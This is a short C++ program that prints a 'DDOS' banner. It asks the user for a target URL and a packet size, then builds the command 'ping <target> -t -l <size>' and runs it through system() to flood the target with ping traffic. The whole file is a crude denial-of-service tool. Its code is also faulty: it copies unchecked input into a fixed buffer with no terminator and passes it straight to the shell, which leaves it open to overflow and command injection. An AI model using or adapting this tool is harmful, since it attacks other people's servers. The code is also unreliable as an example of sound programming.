#include "pch.h"
#include <iostream>
#include <string>
#include <vector>
using namespace std;


int main()
{
	system("color 3");
	cout << "#####     #####      ######      #####      " << endl
		<< "##  ##    ##  ##    ##    ##    ##   ##     " << endl
		<< "##  ##    ####      ##    ##     ###        " << endl
		<< "##  ##    ##  ##    ##    ##        ###     " << endl
		<< "#####     #####      ######     ##____##    " << endl;
	cout << "Enter URL as target( example www.google.com ): ";
	string url;
	cin >> url;
	cout << "Enter size of the packets( 1000 or 50000 ): ";
	string size;
	cin >> size;
	string ping = "ping ";
	string flud = " -t -l ";
	char zap[800];
	int k = 0;
	for (int i = 0; i < ping.size(); i++)
	{
		zap[k++] = ping[i];
	}
	for (int i = 0; i < url.size(); i++)
	{
		zap[k++] = url[i];
	}
	for (int i = 0; i < flud.size(); i++)
	{
		zap[k++] = flud[i];
	}
	for (int i = 0; i < size.size(); i++)
	{
		zap[k++] = size[i];
	}
	system(zap);
}